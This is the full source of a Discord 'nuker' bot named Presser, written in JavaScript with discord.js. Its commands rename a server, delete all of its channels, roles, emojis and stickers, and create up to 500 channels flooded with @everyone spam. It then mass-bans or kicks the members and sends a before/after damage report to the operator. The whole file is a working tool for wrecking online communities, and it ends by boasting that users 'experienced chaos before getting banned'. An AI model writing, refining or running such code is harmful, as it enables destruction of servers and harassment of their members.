/**
 * Presser - Final Version
 * @author 7teen
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const fs = require("fs");
const path = require("path");

// Setup logging
const logDir = path.join(__dirname, "../logs");
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir);
}
const logFile = path.join(logDir, "latest.log");
// Clear/Create log file
fs.writeFileSync(logFile, "");

const originalLog = console.log;
const originalError = console.error;

function writeToLog(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    fs.appendFileSync(logFile, logMessage);
}

console.log = function (...args) {
    originalLog.apply(console, args);
    writeToLog(args.join(" "));
};

console.error = function (...args) {
    originalError.apply(console, args);
    writeToLog("[ERROR] " + args.join(" "));
};

const nuker = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.GUILD_MEMBERS,
        Intents.FLAGS.GUILD_BANS,
        Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        Intents.FLAGS.GUILD_WEBHOOKS,
        Intents.FLAGS.GUILD_INVITES,
        Intents.FLAGS.GUILD_VOICE_STATES,
        Intents.FLAGS.GUILD_PRESENCES,
        Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        Intents.FLAGS.DIRECT_MESSAGES,
        Intents.FLAGS.DIRECT_MESSAGE_REACTIONS
    ]
});
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userIDs, disableEveryone, nukeSettings } = require("../config/config.json")

// Global variables for nuke control
let nukeInProgress = false;
let nukeStopped = false;
let countdownInterval = null;
const spamIntervals = new Map(); // Store spam intervals for stopping

nuker.on("ready", () => {
    console.clear();
    console.log(red(`
    
                                                   
    ██▓███   ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███  
    ▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
    ▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
    ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
    ▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░▒████▒░██▓ ▒██▒
    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
    ░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ � ░ ░  ░  ░▒ ░ ▒░
    ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░     ░░   ░ 
    ░        ░  ░      ░        ░     ░  ░   ░     
                                            
                                                      
                            Final Version v1.0
                    Nuker: ${nuker.user.tag}
                    Prefix: ${prefix}
                    Countdown: ${nukeSettings.countdownTime}s (${Math.ceil(nukeSettings.countdownTime / 60)} min)
    `))
    nuker.user.setActivity({ name: "Presser Final v1.0", type: "PLAYING" });
});

nuker.on("messageCreate", (message) => {
    // Skip messages from bots and DMs
    if (message.author.bot || !message.guild) return;

    // Use v13 compatible permission checking
    const me = message.guild.members.me;

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**Presser Final Version v1.0**
    \n**mass channels ;**
    ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
    **mass channel n ping ;**
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
    **mass roles ;**
    ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
    **delete channels ;**
    ${prefix}dc\n
    **delete roles ;**
    ${prefix}dr\n
    **delete emotes ;**
    ${prefix}de\n
    **delete stickers (new) ;**
    ${prefix}ds\n
    **mass kick ;**
    ${prefix}mk\n
    **mass ban ;**
    ${prefix}mb\n
    **nuke ;**
    ${prefix}nuke - Full server nuke sequence with countdown\n
    **stop spam ;**
    ${prefix}stop - Stop all spam intervals and nuke process
    `)
        .setFooter({ text: `© Presser Final v1.0` })
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms - using v13 permission strings
    const channelPerms = me.permissions.has("MANAGE_CHANNELS");
    const banPerms = me.permissions.has("BAN_MEMBERS");
    const kickPerms = me.permissions.has("KICK_MEMBERS");
    const rolePerms = me.permissions.has("MANAGE_ROLES");
    const emotePerms = me.permissions.has("MANAGE_EMOJIS_AND_STICKERS");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0]; // Used for amount
    var args2 = args.slice(1).join(' ') // Naming things
    var args3 = args.slice(2).join(', '); // Other

    // Safe message function to handle deleted channels
    function safeSend(msg, content) {
        try {
            // Check if the channel exists and is text-based
            if (msg.channel && typeof msg.channel.send === 'function') {
                return msg.channel.send(content).catch(err => {
                    return null;
                });
            } else {
                return null;
            }
        } catch (error) {
            return null;
        }
    }

    // Check if user is authorized
    function isAuthorized(userId) {
        return userIDs.includes(userId);
    }

    // COMMAND HANDLERS
    if (!disableEveryone) {
        // Commands

        // Help
        if (message.content.startsWith(prefix + "help")) {
            safeSend(message, { embeds: [help] });
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            MassChannels(args1, args2).catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            DelAllChannels().catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            MassChnPing(args1, args2, args3).catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            MassRoles(args1, args2).catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            DelAllRoles().catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            DelAllStickers().catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            DelAllEmotes().catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            BanAll().catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            KickAll().catch((err) => {
                safeSend(message, err);
            });
        }

        // Nuke Command
        if (message.content.startsWith(prefix + "nuke")) {
            Nuke().catch((err) => {
                safeSend(message, err);
            });
        }

        // Stop Spam Command
        if (message.content.startsWith(prefix + "stop")) {
            StopSpam().then(() => {
                safeSend(message, "All spam intervals and nuke process stopped");
            }).catch((err) => {
                safeSend(message, err);
            });
        }
    } else {
        // Commands with userID check

        // Help
        if (message.content.startsWith(prefix + "help")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            safeSend(message, { embeds: [help] });
        }

        // Mass Channels
        if (message.content.startsWith(prefix + "mc")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            MassChannels(args1, args2).catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all channels
        if (message.content.startsWith(prefix + "dc")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            DelAllChannels().catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Channels and Ping
        if (message.content.startsWith(prefix + "cp")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            MassChnPing(args1, args2, args3).catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Roles
        if (message.content.startsWith(prefix + "mr")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            MassRoles(args1, args2).catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all Roles
        if (message.content.startsWith(prefix + "dr")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            DelAllRoles().catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all Stickers
        if (message.content.startsWith(prefix + "ds")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            DelAllStickers().catch((err) => {
                safeSend(message, err);
            });
        }

        // Delete all Emotes
        if (message.content.startsWith(prefix + "de")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            DelAllEmotes().catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Ban
        if (message.content.startsWith(prefix + "mb")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            BanAll().catch((err) => {
                safeSend(message, err);
            });
        }

        // Mass Kick
        if (message.content.startsWith(prefix + "mk")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            KickAll().catch((err) => {
                safeSend(message, err);
            });
        }

        // Nuke Command
        if (message.content.startsWith(prefix + "nuke")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            Nuke().catch((err) => {
                safeSend(message, err);
            });
        }

        // Stop Spam Command
        if (message.content.startsWith(prefix + "stop")) {
            if (!isAuthorized(message.author.id)) return safeSend(message, "You are not authorised to use any of this tools' commands.");
            StopSpam().then(() => {
                safeSend(message, "All spam intervals and nuke process stopped");
            }).catch((err) => {
                safeSend(message, err);
            });
        }
    }

    // Nuking Functions

    /**
     * Stop all spam intervals and nuke process
     */
    function StopSpam() {
        return new Promise((resolve) => {
            // Always set stop flag
            nukeStopped = true;

            // Stop nuke process if running
            if (nukeInProgress) {
                nukeInProgress = false;
                if (countdownInterval) {
                    clearInterval(countdownInterval);
                    countdownInterval = null;
                }
                console.log(greenBright("Nuke process stopped by user"));
            }

            console.log(greenBright(`Stopped spam process`));
            resolve();
        });
    }

    /**
     * Excessive amount of channels
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     */
    function MassChannels(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");

            // Reset stop flag for new operation
            nukeStopped = false;

            const name = !channelName ? `${message.author.username} was here` : channelName;
            const promises = [];

            // Create all channels in parallel
            for (let i = 0; i < amount; i++) {
                const channelPromise = new Promise((resolveChannel) => {
                    if (nukeStopped) return resolveChannel();
                    if (message.guild.channels.cache.size >= 500) return resolveChannel();

                    setTimeout(() => {
                        if (nukeStopped) return resolveChannel();

                        message.guild.channels.create(name, { type: "GUILD_TEXT" }).then(() => {
                            resolveChannel();
                        }).catch((err) => {
                            // Suppress "max channels" error - it's expected when hitting Discord's limit
                            if (!err.message || !err.message.includes("Maximum number of server channels")) {
                                console.log(red("Error creating channel: " + err));
                            }
                            resolveChannel();
                        });
                    }, i * 10); // 10ms stagger
                });

                promises.push(channelPromise);
            }

            Promise.all(promises).then(() => resolve());
        });
    }

    /**
     * Excessive amount of channels and mentions
     * @param {number} amount Amount of channels to mass create
     * @param {string} channelName Name of channel
     * @param {string} pingMessage Message to be sent when everyone is mentioned
     */
    function MassChnPing(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass channels");
            if (isNaN(amount) || amount <= 0) return reject("Type Error: Use a positive number for the amount");
            if (amount > 500) return reject("Amount Error: Max guild channel size is 500 | Tip: Use a number lower than 500");
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Unspecified Args: Specify the message you wish to mass mention");

            // Reset stop flag for new operation
            nukeStopped = false;

            const name = !channelName ? `${message.author.username} was here` : channelName;
            const promises = [];

            // Create all channels in parallel
            for (let i = 0; i < amount; i++) {
                const channelPromise = new Promise((resolveChannel) => {
                    if (nukeStopped) return resolveChannel();
                    if (message.guild.channels.cache.size >= 500) return resolveChannel();

                    // Small stagger to avoid rate limit spikes
                    setTimeout(() => {
                        if (nukeStopped) return resolveChannel();

                        message.guild.channels.create(name, { type: "GUILD_TEXT" }).then((ch) => {
                            if (nukeStopped) return resolveChannel();

                            // Start 3 spam threads per channel for maximum throughput
                            for (let thread = 0; thread < 3; thread++) {
                                const spamLoop = () => {
                                    if (nukeStopped) return;
                                    ch.send("@everyone " + pingMessage)
                                        .catch((err) => {
                                            // If channel is deleted or unavailable, stop spamming it
                                            if (err.code === 10003 || err.message.includes("Channel is not available")) return;
                                        })
                                        .finally(() => {
                                            if (!nukeStopped && message.guild.channels.cache.has(ch.id)) setTimeout(spamLoop, 1);
                                        });
                                };
                                spamLoop();
                            }

                            resolveChannel();
                        }).catch((err) => {
                            // Suppress "max channels" error - it's expected when hitting Discord's limit
                            if (!err.message || !err.message.includes("Maximum number of server channels")) {
                                console.log(red("Error creating channel: " + err));
                            }
                            resolveChannel();
                        });
                    }, i * 10); // 10ms stagger between channel creations
                });

                promises.push(channelPromise);
            }

            // Wait for all channels to be created
            Promise.all(promises).then(() => resolve());
        });
    }

    /**
     * Deletes all channels in a guild
     * @param {boolean} fromNuke Whether this is called from the nuke command
     */
    function DelAllChannels(fromNuke = false) {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");

            // Only stop spam if NOT called from nuke
            const preStep = fromNuke ? Promise.resolve() : StopSpam();

            preStep.then(() => {
                const channels = message.guild.channels.cache;
                let deleted = 0;
                const total = channels.size;

                if (total === 0) return resolve();

                channels.forEach((ch) => {
                    ch.delete().then(() => {
                        deleted++;
                        if (deleted === total) resolve();
                    }).catch((err) => {
                        console.log(red("Error deleting channel: " + err.message));
                        deleted++;
                        if (deleted === total) resolve();
                    });
                });
            });
        });
    }

    /**
     * Excessive amount of roles
     * @param {number} amount Amount of roles
     * @param {string} roleName Role name
     */
    function MassRoles(amount, roleName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");

            // Reset stop flag for new operation
            nukeStopped = false;

            const name = !roleName ? "nuked" : roleName;
            const promises = [];

            // Create all roles in parallel
            for (let i = 0; i < amount; i++) {
                const rolePromise = new Promise((resolveRole) => {
                    if (nukeStopped) return resolveRole();
                    if (message.guild.roles.cache.size >= 250) return resolveRole();

                    setTimeout(() => {
                        if (nukeStopped) return resolveRole();

                        message.guild.roles.create({
                            name: name,
                            color: "RANDOM"
                        }).then(() => {
                            resolveRole();
                        }).catch((err) => {
                            console.log(red("Error creating role: " + err));
                            resolveRole();
                        });
                    }, i * 10); // 10ms stagger
                });

                promises.push(rolePromise);
            }

            Promise.all(promises).then(() => resolve());
        })
    }

    /**
     * Deletes all roles
     */
    function DelAllRoles() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");

            const roles = message.guild.roles.cache;
            let deleted = 0;
            const total = roles.size;

            if (total === 0) return resolve();

            roles.forEach((r) => {
                // Don't delete @everyone role
                if (r.id === message.guild.id) {
                    deleted++;
                    if (deleted === total) resolve();
                    return;
                }

                r.delete().then(() => {
                    deleted++;
                    if (deleted === total) resolve();
                }).catch((err) => {
                    if (err.code !== 50013) { // Ignore Missing Permissions
                        console.log(red("Error deleting role: " + err.message));
                    }
                    deleted++;
                    if (deleted === total) resolve();
                });
            });
        });
    }

    /**
     * Deletes all emotes
     */
    function DelAllEmotes() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");

            const emotes = message.guild.emojis.cache;
            let deleted = 0;
            const total = emotes.size;

            if (total === 0) return resolve();

            emotes.forEach((e) => {
                e.delete().then(() => {
                    deleted++;
                    if (deleted === total) resolve();
                }).catch((err) => {
                    console.log(red("Error deleting emote: " + err.message));
                    deleted++;
                    if (deleted === total) resolve();
                });
            });
        });
    }

    /**
     * Deletes all stickers
     */
    function DelAllStickers() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");

            const stickers = message.guild.stickers.cache;
            let deleted = 0;
            const total = stickers.size;

            if (total === 0) return resolve();

            stickers.forEach((s) => {
                s.delete().then(() => {
                    deleted++;
                    if (deleted === total) resolve();
                }).catch((err) => {
                    console.log(red("Error deleting sticker: " + err.message));
                    deleted++;
                    if (deleted === total) resolve();
                });
            });
        });
    }

    /**
     * Ban all guild Members
     */
    function BanAll() {
        return new Promise((resolve, reject) => {
            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");

            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);

            // Filter out the bot itself and authorized users
            arrayOfIDs = arrayOfIDs.filter(id =>
                id !== nuker.user.id && !userIDs.includes(id)
            );

            // Skip sending messages if channels are deleted
            if (message.channel && message.channel.deleted === false) {
                safeSend(message, "Found " + arrayOfIDs.length + " users.").then((msg) => {
                    performBanning(arrayOfIDs, resolve, msg);
                }).catch(err => {
                    console.log(red("Error sending message: " + err));
                    performBanning(arrayOfIDs, resolve);
                });
            } else {
                // Directly perform banning if channel is not available
                performBanning(arrayOfIDs, resolve);
            }
        });

        function performBanning(arrayOfIDs, resolve, msg = null) {
            if (msg && msg.editable) {
                msg.edit("Banning...").catch(console.error);
            }

            let banned = 0;
            const banNextMember = () => {
                if (banned >= arrayOfIDs.length) {
                    return resolve();
                }

                const user = arrayOfIDs[banned];
                const member = message.guild.members.cache.get(user);
                if (member && member.bannable) {
                    member.ban({ reason: 'Server nuke' }).then(() => {
                        console.log(greenBright(`${member.user.tag} was banned.`));
                        banned++;
                        setTimeout(banNextMember, 100);
                    }).catch((err) => {
                        console.log(red("Error banning member: " + err.message));
                        banned++;
                        setTimeout(banNextMember, 100);
                    });
                } else {
                    banned++;
                    setTimeout(banNextMember, 100);
                }
            };

            banNextMember();
        }
    }

    /**
     * Kick all guild Members
     */
    function KickAll() {
        return new Promise((resolve, reject) => {
            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");

            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);

            // Filter out the bot itself and authorized users
            arrayOfIDs = arrayOfIDs.filter(id =>
                id !== nuker.user.id && !userIDs.includes(id)
            );

            // Skip sending messages if channels are deleted
            if (message.channel && message.channel.deleted === false) {
                safeSend(message, "Found " + arrayOfIDs.length + " users.").then((msg) => {
                    performKicking(arrayOfIDs, resolve, msg);
                }).catch(err => {
                    console.log(red("Error sending message: " + err));
                    performKicking(arrayOfIDs, resolve);
                });
            } else {
                // Directly perform kicking if channel is not available
                performKicking(arrayOfIDs, resolve);
            }
        });

        function performKicking(arrayOfIDs, resolve, msg = null) {
            if (msg && msg.editable) {
                msg.edit("Kicking...").catch(console.error);
            }

            let kicked = 0;
            const kickNextMember = () => {
                if (kicked >= arrayOfIDs.length) {
                    return resolve();
                }

                const user = arrayOfIDs[kicked];
                const member = message.guild.members.cache.get(user);
                if (member && member.kickable) {
                    member.kick().then(() => {
                        console.log(greenBright(`${member.user.tag} was kicked.`));
                        kicked++;
                        setTimeout(kickNextMember, 100);
                    }).catch((err) => {
                        console.log(red("Error kicking member: " + err.message));
                        kicked++;
                        setTimeout(kickNextMember, 100);
                    });
                } else {
                    kicked++;
                    setTimeout(kickNextMember, 100);
                }
            };

            kickNextMember();
        }
    }

    /**
     * Nuke command - executes all commands in sequence with countdown
     */
    function Nuke() {
        return new Promise(async (resolve, reject) => {
            if (nukeInProgress) {
                return reject("A nuke process is already running.");
            }

            nukeInProgress = true;
            nukeStopped = false;

            // Get countdown time from config (default to 30 seconds)
            const countdownTime = nukeSettings.countdownTime || 30;
            let timeLeft = countdownTime;

            // Send initial countdown message
            const countdownMsg = await safeSend(message,
                `🚀 NUKE LAUNCHED! Banning all members in ${timeLeft} seconds...\n` +
                `⏰ Time remaining: ${timeLeft}s\n` +
                `Type \`${prefix}stop\` to cancel the nuke.`
            );

            // Start countdown timer
            countdownInterval = setInterval(async () => {
                if (nukeStopped) {
                    clearInterval(countdownInterval);
                    return;
                }

                timeLeft--;

                if (timeLeft <= 0) {
                    clearInterval(countdownInterval);
                    return;
                }

                // Log countdown to console every 10 seconds (and at key milestones)
                if (timeLeft % 10 === 0 || timeLeft <= 10) {
                    console.log(cyan(`⏰ Countdown: ${timeLeft}s remaining (${Math.ceil(timeLeft / 60)} min)`));
                }

                // Update countdown message
                if (countdownMsg && countdownMsg.editable) {
                    countdownMsg.edit(
                        `🚀 NUKE LAUNCHED! Banning all members in ${timeLeft} seconds...\n` +
                        `⏰ Time remaining: ${timeLeft}s\n` +
                        `Type \`${prefix}stop\` to cancel the nuke.`
                    ).catch(() => { }); // Ignore errors if message was deleted
                }
            }, 1000);

            // Wait 3 seconds so user can see the message before destruction begins
            await new Promise(r => setTimeout(r, 3000));

            try {
                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                // Capture server stats BEFORE nuke (before ANY changes)
                const statsBefore = {
                    name: message.guild.name,
                    channels: message.guild.channels.cache.size,
                    roles: message.guild.roles.cache.size,
                    members: message.guild.memberCount,
                    emojis: message.guild.emojis.cache.size,
                    stickers: message.guild.stickers.cache.size
                };

                // PHASE 1: Immediate destruction (sequential)
                // Change server name
                if (nukeSettings.serverName) {
                    console.log(cyan(`Changing server name to "${nukeSettings.serverName}"...`));
                    await message.guild.setName(nukeSettings.serverName).catch(err => {
                        console.log(red("Error changing server name: " + err.message));
                    });
                }

                console.log(cyan("Deleting all channels..."));
                // Pass true to prevent stopping the nuke process
                await DelAllChannels(true).catch(err => {
                    console.log(red("Error deleting channels: " + err.message));
                });

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                console.log(cyan("Deleting all roles..."));
                await DelAllRoles().catch(err => {
                    console.log(red("Error deleting roles: " + err.message));
                });

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                console.log(cyan("Deleting all emotes..."));
                await DelAllEmotes().catch(err => {
                    console.log(red("Error deleting emotes: " + err.message));
                });

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                console.log(cyan("Deleting all stickers..."));
                await DelAllStickers().catch(err => {
                    console.log(red("Error deleting stickers: " + err.message));
                });

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                // PHASE 2: Create chaos (users start seeing spam!)
                console.log(cyan("Creating mass channels with pings..."));
                await MassChnPing(nukeSettings.channelAmount, nukeSettings.channelName, nukeSettings.pingMessage)
                    .catch(err => {
                        console.log(red("Error creating channels: " + err.message));
                    });

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                console.log(cyan("Creating mass roles..."));
                await MassRoles(nukeSettings.roleAmount, nukeSettings.roleName)
                    .catch(err => {
                        console.log(red("Error creating roles: " + err.message));
                    });

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                // PHASE 3: Wait for remaining countdown time
                const timeElapsed = (countdownTime - timeLeft) * 1000;
                const remainingTime = Math.max(0, (countdownTime * 1000) - timeElapsed);

                if (remainingTime > 0) {
                    console.log(cyan(`Waiting ${Math.ceil(remainingTime / 1000)} seconds before banning...`));

                    // Wait but check for stop command periodically
                    const checkInterval = 1000;
                    let waited = 0;
                    while (waited < remainingTime) {
                        if (nukeStopped) {
                            throw new Error("Nuke process stopped by user");
                        }

                        await new Promise(r => setTimeout(r, checkInterval));
                        waited += checkInterval;
                    }
                }

                // Check if nuke was stopped
                if (nukeStopped) {
                    throw new Error("Nuke process stopped by user");
                }

                // Update message before banning
                if (countdownMsg && countdownMsg.editable) {
                    countdownMsg.edit("⏰ Countdown completed! Banning all members...").catch(() => { });
                }

                // PHASE 4: Execute mass ban
                console.log(cyan("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
                console.log(cyan("⚠️  STOPPING SPAM TO EXECUTE BAN..."));

                // Stop all spam to free up resources for banning
                nukeStopped = true;
                await new Promise(r => setTimeout(r, 2000)); // Wait 2 seconds for spam to stop
                nukeStopped = false; // Reset for future nukes

                console.log(cyan("🔨 EXECUTING MASS BAN..."));
                console.log(cyan("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));

                await BanAll().catch(err => {
                    console.log(red("Error during mass ban: " + err.message));
                });

                console.log(cyan("✅ Ban phase completed!"));

                // Clean up
                clearInterval(countdownInterval);
                countdownInterval = null;
                nukeInProgress = false;

                // Capture server stats AFTER nuke
                const statsAfter = {
                    name: message.guild.name,
                    channels: message.guild.channels.cache.size,
                    roles: message.guild.roles.cache.size,
                    members: message.guild.memberCount,
                    emojis: message.guild.emojis.cache.size,
                    stickers: message.guild.stickers.cache.size
                };

                // Send report to configured user(s)
                if (nukeSettings.reportUserID) {
                    const userIDs = Array.isArray(nukeSettings.reportUserID)
                        ? nukeSettings.reportUserID
                        : [nukeSettings.reportUserID];

                    for (const userID of userIDs) {
                        try {
                            const reportUser = await nuker.users.fetch(userID);
                            const reportEmbed = new MessageEmbed()
                                .setTitle("🚀 Nuke Report")
                                .setColor(0xFF0000)
                                .addField("📊 Before Nuke",
                                    `**Server Name:** ${statsBefore.name}\n` +
                                    `**Channels:** ${statsBefore.channels}\n` +
                                    `**Roles:** ${statsBefore.roles}\n` +
                                    `**Members:** ${statsBefore.members}\n` +
                                    `**Emojis:** ${statsBefore.emojis}\n` +
                                    `**Stickers:** ${statsBefore.stickers}`,
                                    true
                                )
                                .addField("💥 After Nuke",
                                    `**Server Name:** ${statsAfter.name}\n` +
                                    `**Channels:** ${statsAfter.channels}\n` +
                                    `**Roles:** ${statsAfter.roles}\n` +
                                    `**Members:** ${statsAfter.members}\n` +
                                    `**Emojis:** ${statsAfter.emojis}\n` +
                                    `**Stickers:** ${statsAfter.stickers}`,
                                    true
                                )
                                .setFooter({ text: `Server ID: ${message.guild.id}` })
                                .setTimestamp();

                            await reportUser.send({ embeds: [reportEmbed] });
                            console.log(cyan(`Nuke report sent to ${reportUser.tag}!`));
                        } catch (err) {
                            console.log(red(`Failed to send nuke report to ${userID}: ` + err.message));
                        }
                    }
                }

                safeSend(message, "✅ Nuke process completed! Users experienced chaos before getting banned.");
                resolve();

            } catch (error) {
                // Clean up on error
                if (countdownInterval) {
                    clearInterval(countdownInterval);
                    countdownInterval = null;
                }
                nukeInProgress = false;

                if (error.message === "Nuke process stopped by user") {
                    // Do not log as error, just resolve
                    reject(error);
                } else {
                    console.error(red("Nuke error: " + error));
                    safeSend(message, "❌ Nuke process failed: " + error.message);
                    reject(error);
                }
            }
        });
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}